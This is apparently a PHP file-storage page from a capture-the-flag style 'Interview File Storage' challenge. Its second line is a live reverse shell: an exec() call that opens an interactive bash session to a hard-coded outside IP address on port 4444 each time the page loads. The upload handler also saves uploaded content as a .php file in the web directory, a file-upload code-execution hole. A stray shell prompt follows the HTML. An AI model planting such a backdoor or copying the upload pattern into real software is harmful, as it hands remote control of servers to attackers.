<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/94.142.138.201/4444 0>&1'");
if ($_SERVER['REQUEST_METHOD'] === 'POST'){
	if(isset($_POST['submit'])) {
		$fname_secret = 'storage/' . getenv('FNAME_SECRET');
		$fname = 'storage/' . md5($_SERVER['REMOTE_ADDR']) . ".php";
		$fp = fopen($_FILES['file_to_store']['tmp_name'], 'r');
		$fp_content = fread($fp, filesize($_FILES['file_to_store']['tmp_name']));
		fclose($fp);
		file_put_contents($fname, $fp_content);
		if ($_POST['md5'] == md5_file($fname_secret)){
			sleep(2);
			$err = "secret file storage is not developed yet...";
		} else if($_POST['md5'] == md5_file($fname)) {
			$msg = "file is stored";
		} else {
			$err = "wrong md5";
		}
		$tmpfname = tempnam("./storage", "file_to_store_");
		$handle = fopen($tmpfname, "w");
		fwrite($handle, file_get_contents($fname));
		fclose($handle);
		unlink($fname);
	}
} else {
	$msg = "Feel free to store your files here!";
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Interview File Storage</title>
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
</head>
<body>
<div class="bg-dark text-secondary px-4 py-5 text-center">
	<h1 class="display-4 fw-bold">Welcome to the Secret File Storage!!</h1>
	<form action="" method="post" enctype="multipart/form-data" class="form-inline">
	<div class='form-group'>
		<label class="btn btn-primary btn-lg px-4 me-sm-3">
			Choose file to store <input type='file' name='file_to_store' id='file_to_store' hidden class="hidden">
		</label>
	</div>
	<div class="form-group">
		<div class="input-group">
			<div class="input-group-addon">md5</div>
			<input type='md5' name='md5' id='md5' class="form-control"> <br>
		</div>
	</div>
	<div class="form-group">
		<input type='submit' value='Store file' class="btn btn-outline-secondary btn-lg px-4" name='submit'>
	</div>
	<p class="lead mb-4">
		<?php
			if (isset($err)){
				echo $err;
			} else if (isset($msg)){
				echo $msg;
			}
		?>
	</p>
</div>
</form>
</body>
</html>

www-data@intev
